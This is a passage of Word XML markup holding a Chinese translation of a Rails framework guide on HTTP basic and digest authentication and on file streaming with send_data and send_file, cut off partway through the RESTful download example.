        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>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摘要验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4032650A"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10.1 HTTP 基本验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685AFAE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HTTP 基本验证是一种被大部分浏览器和其他 HTTP 客户端支持的验证方案。举例来说，考虑一种情况，管理员区域只能通过在浏览器的HTTP基本对话框窗口输入用户名和密码来进入。使用内建验证十分简单，只需要你使用一个方法，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http_basic_authenticate_with</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="74CF8DBB" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0557B08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AdminController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="101C11A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http_basic_authenticate_with :name</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "humbaba", :password</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "5baa61e4"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FDCCDC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597D267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把它放到适当的位置，你可以创建继承自 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>AdminController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用命名空间的控制器。过滤器会为所有那些控制器中的动作运行，使用 HTTP 基本验证保护它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313A3E16"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10.2 HTTP 摘要验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226CA01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HTTP 摘要验证是优于基本验证的因为它不需要客户端发送明文密码经过网络（尽管使用HTTPS的 HTTP 基本验证是安全的）。在 Rails 中使用摘要验证十分简单，只需要使用一个方法，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticate_or_request_with_http_digest</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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7656"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="32DF6FC9" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C45905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AdminController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53BFC74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USERS</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= { "lifo"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "world"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F4CCEE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40AB35A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before_filter :authenticate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03366D0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5A01C78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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1150C7B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630B568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authenticate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4503741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authenticate_or_request_with_http_digest do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|username|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3088E07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USERS[username]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E18B7E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655333D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43F897A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40D044B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如上例中所示，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticate_or_request_with_http_digest</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> block 只接受一个引数 – 用户名。block会返回密码。 从 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticate_or_request_with_http_digest</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会导致验证失败。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E9F4E2"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11 流与文件下载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A643CF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有时候你可能想要发送一个文件到用户以代替渲染一个 HTML 页面。Rails 中所有的控制器都有 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send_data</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send_file</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法，它们都可以流式发送数据到客户端。</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send_file</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个方便的方法，它让你提供磁盘上的一个文件名，它会为你流式发送内容到文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7284D3A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要流式发送数据到客户端，使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send_data</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7656"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2540CCBE" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CB7D55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require "prawn"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="637FCB8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ClientsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38AF2BE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生成一个包含客户信息的 PDF 文档并返回。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3333B8B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用户将使用文件下载得到该 PDF</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6242647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download_pdf</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2814886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client = Client.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36C20EE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send_data generate_pdf(client),</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DC320F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:filename</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "#{client.name}.pdf",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51D57F0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:type</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "application/pdf"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0676DF5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19632ED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0D08382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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F5F38C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53116FB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generate_pdf(client)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EF6FE3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Prawn::Document.new</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44837C2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text client.name, :align</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :center</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="033F3E9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text "Address: #{client.address}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C50C67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text "Email: #{client.email}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31DB02D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end.render</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A08349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67D659D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41FB6DB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上例中 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>download_pdf</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作会调用一个实际生成 PDF 文档并返回为字符串的私有方法。该字符串会被流式发送到客户端，成为文件下载并且文件名会建议给用户。有时当发送文件到用户时，你可能不会想让他们下载文件。以图片为例，它可以被内嵌在 HTML 页面中。告知浏览器一个文件意图不是为了下载，你可以设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:disposition</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来 “inline” （内嵌）。该选项与之相反的值且为默认值是 “attachment” （附件）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65ADC7E5"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11.1 发送文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DA8D0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如果你想要发送一个已在磁盘存在的文件，使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send_file</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8016"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="17E172E6" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19615AE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ClientsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46E81D9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流式发送一个已生成并存储在磁盘上的文件。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51C3F80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download_pdf</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="660E298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client = Client.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="485B56B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send_file("#{Rails.root}/files/clients/#{client.id}.pdf",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73197E7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:filename</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "#{client.name}.pdf",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3414B37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:type</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "application/pdf")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1935537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2DCFCC6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3F018F1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这将会一次读取并发送流 4kB，避免立即载入整个文件到内存中。你可以关闭流发送通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:stream</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项或者通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:buffer_size</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项调整块大小。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DC0FC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 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:type</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 未被指定，会从指定的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:filname</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的文件扩展名猜出。如果内容类型不是注册为该扩展名，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application/octet-stream</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会被使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A56CAC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当心使用从客户端而来的数据（params, cookies，其他）来定位文件，因为会有允许某些人取得某些他们不应该看到的文件的权限的安全风险。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAEA4B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通过 Rails 流式发送静态文件来代替把它们放在你的 web 服务器的公共文件夹中是不推荐的。让用户直接使用 Apache 或者其他 web 服务器下载文件更有效率，保证请求不会不必要地经过整个 Rails 栈。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF2BC15"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11.2 RESTful 下载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572627C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尽管 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send_data</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以工作，如果你正在创建一个有一些文件下载动作的 RESTful 应用，它通常不是必须的。在 REST 术语中，上例中的 PDF 文件可以认为是另一种client 资源的表现。Rails 提供一种简单和十分平滑的方式来实现 “RESTful 下载”。这里是你如何重写该例，使得 PDF 下载是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作的一部分，不需要任何流传输:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7776"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0E08B873" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DD1C9D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ClientsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2438822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用户可以请求来接受该资源为 HTML 或 PDF 。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26E5548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show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46E79FE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@client</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
